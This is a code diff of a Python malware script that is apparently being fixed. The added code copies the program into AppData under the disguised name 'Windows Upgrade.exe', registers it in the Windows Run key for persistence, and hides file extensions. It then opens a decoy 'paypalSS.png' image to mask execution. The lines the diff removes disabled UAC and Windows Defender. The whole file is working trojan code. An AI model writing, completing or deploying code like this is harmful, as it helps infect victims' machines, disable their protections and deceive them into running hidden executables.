@@ -4,23 +4,20 @@ import smtplib
 import os
 import tempfile
 import shutil
+import sys
+# import pyuac
 
 # Adds Download.exe to windows reg editor for persisitenece
 def become_persistent():
-    Malocation = os.environ["appdata"] + "\\Windows Explorer.exe"
+    Malocation = os.environ["appdata"] + "\\Windows Upgrade.exe"
     if not os.path.exists(Malocation):
-        shutil.copyfile(sys.exexutable, Malocation)
-        subprocess.call("reg add Computer\HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Explorer /t REG_SZ /d dist/new/image.exe" + Malocation, shell=True)
+           shutil.copyfile(sys.executable, Malocation)
+           subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + Malocation + '"', shell=True)
 
-def Stop_WinDef_UAC():
-    subprocess.Popen("reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f", shell=True)
-    subprocess.Popen("sc config WinDefend start= disabled", shell=True)
-    subprocess.Popen("sc stop WinDefend", shell=True)
-
-Stop_WinDef_UAC()
+become_persistent()
 
 # Turns file extentions off
-subprocess.call("reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced /v HideFileExt /t REG_DWORD /d 1 /f")
+subprocess.call("reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced /v HideFileExt /t REG_DWORD /d 1 /f", shell=True)
 
 file_name = "paypalSS.png"
 subprocess.Popen(file_name, shell=True)
